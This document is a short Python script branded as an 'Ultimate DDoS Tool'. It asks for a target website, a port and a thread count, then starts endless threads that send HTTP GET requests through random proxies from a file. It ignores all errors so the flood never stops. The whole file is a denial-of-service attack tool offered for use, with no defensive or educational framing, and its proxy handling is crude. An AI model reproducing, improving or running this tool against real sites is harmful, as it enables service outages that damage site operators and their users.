# VIKAS_BHAGAT Ultimate DDoS Tool
# Advanced Non-Stop Attack with 100K Proxy Support

import threading
import socket
import random
import time

print("\n=== MADE BY :- VIKAS_BHAGAT🚩 ===\n")

# Target Details
target = input("Target Website (without https://) : ")
port = int(input("Port (default 80) : ") or 80)
thread_count = int(input("Threads (Example 100000) : "))

# Load Proxy List
with open("proxies.txt", "r") as f:
    proxies = f.read().splitlines()

# Attack Function
def attack():
    while True:
        try:
            proxy = random.choice(proxies)
            ip, proxy_port = proxy.split(":")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, int(proxy_port)))

            payload = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode()
            s.sendall(payload)
            print(f"Attack sent from Proxy: {proxy}")
            s.close()
        except:
            pass  # Ignore all errors to keep attack running

# Start Threads
for i in range(thread_count):
    thread = threading.Thread(target=attack)
    thread.daemon = True
    thread.start()

print("\n[!] Attack Started Successfully!")

# Keep Running
while True:
    time.sleep(1)
    
